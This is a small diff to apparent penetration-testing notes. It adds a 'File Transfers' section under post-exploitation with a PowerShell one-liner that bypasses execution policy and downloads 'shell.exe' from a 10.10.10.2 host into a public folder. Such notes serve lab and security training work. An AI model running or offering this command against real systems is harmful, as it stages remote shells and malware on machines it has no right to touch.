@@ -36,6 +36,16 @@ scripts w/ ports
 
 ## Exploitation
 ## Post-Exploitation
+
+### File Transfers
+
+#### From Cmd.exe
+
+'''bash
+powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.2:8080/shell.exe','C:\Users\Public\shell.exe')
+'''
+
+
 ## Privilege Escalation 
 
 ### Linux Privesc
